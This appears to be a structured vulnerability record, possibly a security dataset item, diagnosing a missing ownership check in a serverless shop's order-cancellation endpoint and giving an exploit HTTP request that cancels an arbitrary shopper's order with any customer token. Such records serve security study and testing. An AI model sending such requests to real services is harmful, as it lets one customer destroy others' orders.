diagnosis: The Serverless Express handler receives events behind an API Gateway Lambda authorizer and cancels orders by orderId without checking whether req.apiGateway.event.requestContext.authorizer.customerId owns the order. Any authenticated customer can cancel rival or arbitrary shoppers' orders.
exploit_request:
POST /api/orders/ord_retail_882019/cancel HTTP/1.1
Host: api.eshopserverless.com
Authorization: Bearer <customer_jwt>
